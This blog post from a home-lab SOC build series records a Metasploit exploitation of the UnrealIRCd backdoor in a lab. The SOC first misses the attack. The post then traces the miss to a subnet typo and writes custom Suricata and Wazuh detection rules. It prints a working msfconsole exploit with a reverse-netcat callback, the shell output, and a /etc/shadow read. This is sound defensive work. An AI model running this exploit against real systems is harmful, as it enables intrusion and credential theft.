---
title: "Building Argus SOC  |  Phase 4 Scenario 3  |  Remote Code Execution — Root Shell, Zero Detection"
date: 2026-04-07 10:00:00 +0100
categories: [Projects, ARGUS-SOC]
tags: [soc, homelab, metasploit, unrealircd, rce, exploitation, detection-engineering, suricata, wazuh, claude, telegram, blue-team, red-team, mitre-attack]
description: "Phase 4 Scenario 3 of the Argus SOC build — Metasploit exploits the UnrealIRCd backdoor for a root shell. The SOC sees nothing. Zero alerts, zero detection. Then the root cause is found, custom rules are written, and the re-test produces 12 CRITICAL alerts."
image:
  path: /assets/img/posts/argus-soc/banner.png
  alt: Argus SOC — AI-Augmented Home Lab Security Operations Center
---

> 📌 **Author's note** — This post documents the Argus SOC lab at the time of publication, when the Pi 3B+ served as the MSSP edge sensor and the Pi 5 hosted the vulnerable Docker targets. The architecture was redesigned in [Phase 5](/posts/argus-soc-phase-5/), which introduced a ThinkCentre M920x running Proxmox with an Active Directory lab as the client infrastructure, and moved the edge-sensor role onto the Pi 5. The detection logic, custom rules, and gap analysis described here remain valid; only the host topology has changed.
>
> Build carried out on real hardware in a controlled home lab. Claude (Anthropic) was used as a reasoning and writing assistant — all deployments, attacks, configurations, and verifications were performed by the author.

## Overview

This is the most important scenario in the entire project. An attacker gets a root shell on the client infrastructure, extracts password hashes, and has full system access. The SOC — 49,325 Suricata rules, Wazuh correlation, Claude AI triage, Telegram alerting — sees nothing. Zero alerts. Complete detection failure.

The gap analysis that follows reveals a single-character typo that had silently broken Suricata's network classification since Phase 0. The remediation produces custom rules that turn total blindness into 12 CRITICAL alerts with operator notification in seconds. This is detection engineering in its purest form: attack, fail, understand why, fix, prove it works.

---

## Original Plan: vsftpd Backdoor (Failed)

The Project Book specified this scenario as an exploit of the vsftpd 2.3.4 backdoor (CVE-2011-2523) on port 21. This was tested first and the backdoor does not function under QEMU x86 emulation on ARM64.

The vsftpd backdoor shellcode uses native x86 `fork()` and `bind()` syscalls to open a listener on port 6200. Under QEMU user-mode emulation on ARM64, these syscalls fail silently — the trigger is processed but the bind shell never spawns. Metasploit confirmed: "Unable to connect to backdoor on 6200/TCP."

The UnrealIRCd 3.2.8.1 backdoor on port 6667 was substituted — already discovered during Scenario 1 reconnaissance. Same MITRE technique (T1190), same impact (root shell), same detection expectations.

---

## The Attack

**Timestamp:** 2026-04-04 12:55 UTC
**Target:** 192.168.1.10 port 6667 (UnrealIRCd 3.2.8.1 via Metasploitable 2)

```
msfconsole -q -x "
  use exploit/unix/irc/unreal_ircd_3281_backdoor;
  set RHOSTS 192.168.1.10;
  set payload cmd/unix/reverse_netcat;
  set LHOST 192.168.1.101;
  exploit
"
```

Root shell obtained immediately:

```
[*] Started reverse TCP handler on 192.168.1.101:4444
[*] 192.168.1.10:6667 - Connected to 192.168.1.10:6667
[*] 192.168.1.10:6667 - Sending IRC backdoor command
[*] Command shell session 1 opened (192.168.1.101:4444 -> 192.168.1.10:59392)
```

![Metasploit root shell via UnrealIRCd](/assets/img/posts/argus-soc/phase-4/scenario-3/phase4_scenario3_metasploit-unrealircd-root-shell.png){: width="700" }
_Metasploit exploit — root shell obtained_

![Metasploit root shell via UnrealIRCd](/assets/img/posts/argus-soc/phase-4/scenario-3/phase4_scenario3_metasploit-session.png){: width="700" }
_Metasploit exploit — session obtained on argus-central_

### Post-Exploitation

With root access, the attacker extracted sensitive system data:

```
whoami    → root
id        → uid=0(root) gid=0(root) groups=0(root)
hostname  → argus-central
cat /etc/shadow → root:$1$/avp...REDACTED...:14747:0:99999:7:::
```

Full system compromise — password hashes extracted, root access confirmed. In a real engagement, persistence would be established next.

---

## Detection Results: Total Failure

### Suricata: Zero Alerts

The Suricata log tail was completely silent throughout the entire attack — trigger, backdoor connection, reverse shell callback, and post-exploitation commands. Not one of the 49,325 ET Open rules fired.

### Wazuh: Zero Relevant Alerts

9 events during the attack window — all SSH noise on the Hetzner VPS from internet brute force bots. Zero alerts from argus-edge-01 related to the exploit.

### Claude / Telegram: Never Triggered

No alerts reached n8n. Claude never classified the attack. The operator was never notified.

![Grafana showing zero detection](/assets/img/posts/argus-soc/phase-4/scenario-3/phase4_scenario3_grafana-zero-detection.png){: width="700" }
_Grafana SOC dashboard — no indication of an active compromise_

![Wazuh showing no exploit alerts](/assets/img/posts/argus-soc/phase-4/scenario-3/phase4_scenario3_wazuh-no-exploit-alerts.png){: width="700" }
_Wazuh event list — only SSH noise from internet bots, nothing about the RCE_

An attacker achieved root-level code execution, extracted password hashes, and could have established persistence — all without a single alert reaching the SOC.

---

## Root Cause Analysis

Investigation revealed two critical issues:

### Finding 1: HOME_NET Typo (Since Phase 0)

```yaml
# Configured since the very first deployment:
HOME_NET: "[192.168.10.0/24]"

# The actual lab subnet:
HOME_NET: "[192.168.1.0/24]"
```

`192.168.10.0` vs `192.168.1.0` — a single missing dot. Every Suricata rule referencing `$HOME_NET` or `$EXTERNAL_NET` had been misconfigured from day one. The entire lab subnet was classified as external traffic, causing rules with `$HOME_NET` destinations to never match.

This one typo retroactively explains Scenario 1's missing ET SCAN rules too.

### Finding 2: No Custom Exploit Signature

The ET Open ruleset does not include a specific signature for the UnrealIRCd 3.2.8.1 backdoor trigger (`AB;`). SID 2010484, initially suspected to be the UnrealIRCd rule, turned out to be a FormMailer web application rule. Custom detection rules were needed.

---

## Remediation

### Fix 1 — HOME_NET Correction (Pi 3B+)

In `/etc/suricata/suricata.yaml`:

```yaml
HOME_NET: "[192.168.1.0/24]"
EXTERNAL_NET: "!$HOME_NET"
```

This single fix affected every scenario — all ET rules now correctly identify internal vs external traffic.

### Fix 2 — Custom Suricata Rules (Pi 3B+)

Added to `/etc/suricata/rules/local.rules`:

```
# UnrealIRCd 3.2.8.1 backdoor trigger
alert tcp any any -> $HOME_NET 6667 (
  msg:"LOCAL EXPLOIT UnrealIRCd 3.2.8.1 Backdoor Command";
  flow:established,to_server;
  content:"AB|3b|";
  reference:cve,2010-2075;
  classtype:trojan-activity;
  sid:9000001; rev:1;
)

# Reverse shell callback on common attacker ports
alert tcp $HOME_NET any -> any [4444,4445,5555,1234,9001] (
  msg:"LOCAL SUSPICIOUS Possible reverse shell callback to known attacker port";
  flow:established,to_server;
  classtype:trojan-activity;
  sid:9000002; rev:1;
)
```

Note: The semicolon in `AB;` (the backdoor trigger) must be hex-encoded as `AB|3b|` to avoid conflicting with Suricata's rule field delimiter.

### Fix 3 — Custom Wazuh Correlation Rules (Hetzner)

Added to `/var/ossec/etc/rules/local_rules.xml`:

```xml
<rule id="100030" level="12">
  <if_sid>86601</if_sid>
  <match>LOCAL EXPLOIT UnrealIRCd</match>
  <description>CRITICAL: Active exploitation — UnrealIRCd backdoor command from $(data.srcip)</description>
  <mitre><id>T1190</id></mitre>
</rule>

<rule id="100021" level="14">
  <if_sid>86601</if_sid>
  <match>LOCAL SUSPICIOUS Possible reverse shell</match>
  <description>CRITICAL: Reverse shell callback — $(data.srcip) connecting to attacker port</description>
  <mitre><id>T1059</id></mitre>
</rule>
```

Level 12 and 14 ensure these alerts pass the n8n pre-filter and reach Claude.

### OOM Incident During Remediation

Running `suricata -T` (config test mode) on the Pi 3B+ caused an OOM condition that killed SSH. Recovery was performed remotely via Velociraptor — a VQL query (`execve(argv=["pkill", "-9", "-f", "suricata -T"])`) killed the stuck process from the Hetzner server. This was an unplanned demonstration of real-world DFIR tool usage for remote incident response.

Lesson: never run `suricata -T` on 1GB hardware with 49,000+ rules. Restart the service directly and check the logs.

---

## Re-Test Results: Full Detection

**Timestamp:** 2026-04-04 14:19 UTC
**Same exploit, same payload, same target.**

### Suricata Detection

| SID | Signature | Count |
|---|---|---|
| 9000001 | LOCAL EXPLOIT UnrealIRCd 3.2.8.1 Backdoor Command | 1 |
| 9000002 | LOCAL SUSPICIOUS Possible reverse shell callback | 11 |

### Wazuh Alert Escalation

| Rule ID | Description | Level | Count |
|---|---|---|---|
| 100030 | UnrealIRCd backdoor command detected | 12 | 1 |
| 100021 | Reverse shell callback detected | 14 | 11 |

### Claude AI Classification

All 12 alerts classified as CRITICAL with confidence 0.92–0.98:

- **T1190** (Exploit Public-Facing Application) — for the backdoor trigger
- **T1059** (Command and Scripting Interpreter) — for the reverse shell callback
- **Action:** respond_immediately
- **Summary:** "Suricata detected a reverse shell callback from argus-central (192.168.1.10) to 192.168.1.101:4444, indicating potential command execution and exfiltration. This represents active post-exploitation activity with confirmed bidirectional communication."

### Telegram: 11 CRITICAL Alerts

The operator received 11 CRITICAL alerts within seconds — 1 for the initial exploit trigger, 10 for ongoing reverse shell activity.

![Suricata firing custom rules](/assets/img/posts/argus-soc/phase-4/scenario-3/phase4_scenario3_remediated-suricata-firing.png){: width="700" }
_Suricata firing SID 9000001 (backdoor) and SID 9000002 (reverse shell)_

![Grafana showing 12 critical alerts](/assets/img/posts/argus-soc/phase-4/scenario-3/phase4_scenario3_remediated-grafana-12-critical.png){: width="700" }
_Grafana after remediation — 12 CRITICAL alerts, entire severity pie chart is red_

![Wazuh rules 100030 and 100021 firing](/assets/img/posts/argus-soc/phase-4/scenario-3/phase4_scenario3_remediated-wazuh-rules-100030-100021.png){: width="700" }
_Wazuh dashboard — custom rules 100030 and 100021 firing at level 12 and 14_

![Telegram CRITICAL alerts flooding](/assets/img/posts/argus-soc/phase-4/scenario-3/phase4_scenario3_remediated-telegram-critical-flood.png){: width="700" }
_Telegram — 11 CRITICAL alerts delivered to the operator within seconds_

---

## Before / After

| Metric | Before | After |
|---|---|---|
| Suricata alerts | 0 | 12 |
| Wazuh alerts | 0 | 12 (all level 12–14) |
| Claude classification | Never reached | 12× CRITICAL |
| Telegram alerts | 0 | 11 |
| Time to operator notification | Never | ~5 seconds |

---

## Progression Across Scenarios

| Aspect | Scenario 1 (Recon) | Scenario 2 (Brute Force) | Scenario 3 (RCE) |
|---|---|---|---|
| Initial detection | Partial (protocol anomalies) | Full — worked first time | **Zero — total failure** |
| Root cause | HOME_NET typo | N/A | HOME_NET typo + missing signatures |
| Custom rules written | 1 (scan correlation) | 0 | 2 Suricata + 2 Wazuh |
| After remediation | ET SCAN firing | N/A | 12 CRITICAL, full pipeline |
| Claude reached | No (level 3) | Yes — MEDIUM | Yes — CRITICAL |
| Telegram | No | Yes (2 alerts) | Yes (11 alerts) |

---

## Evidence Collected

### Screenshots — Initial Attack (Zero Detection)

| Screenshot | Filename |
|---|---|
| Metasploit root shell | `phase4_scenario3_metasploit-unrealircd-root-shell.png` |
| Suricata + Zeek silent during exploit | `phase4_scenario3_suricata-zeek-silent.png` |
| Grafana — zero detection | `phase4_scenario3_grafana-zero-detection.png` |
| Wazuh — no exploit alerts | `phase4_scenario3_wazuh-no-exploit-alerts.png` |

### Screenshots — After Remediation

| Screenshot | Filename |
|---|---|
| Suricata firing SID 9000001 + 9000002 | `phase4_scenario3_remediated-suricata-firing.png` |
| Metasploit root shell (re-run) | `phase4_scenario3_remediated-metasploit-shell.png` |
| Grafana — 12 CRITICAL alerts | `phase4_scenario3_remediated-grafana-12-critical.png` |
| Wazuh — rules 100030 + 100021 | `phase4_scenario3_remediated-wazuh-rules-100030-100021.png` |
| Telegram — 11 CRITICAL alerts | `phase4_scenario3_remediated-telegram-critical-flood.png` |

### Data Exports

| File | Description |
|---|---|
| `scenario3_wazuh-events-export.csv` | [Download](/assets/downloads/argus-soc/phase-4/scenario-3/scenario3_wazuh-events-export.csv) — zero detection run |
| `scenario3_remediated_wazuh-events-export.csv` | [Download](/assets/downloads/argus-soc/phase-4/scenario-3/scenario3_remediated_wazuh-events-export.csv) — successful detection run |

---

## What's Next — Scenario 4

Scenario 4 targets the DVWA web application with SQLmap. Like this scenario, the initial result is zero detection — Suricata's HTTP inspection rules don't fire because `HTTP_PORTS` only includes port 80, and DVWA runs on port 8080. Another configuration gap, another remediation, another re-test.

---

*Part of the [Argus SOC](https://github.com/Al3grus/Argus-SOC) build series.*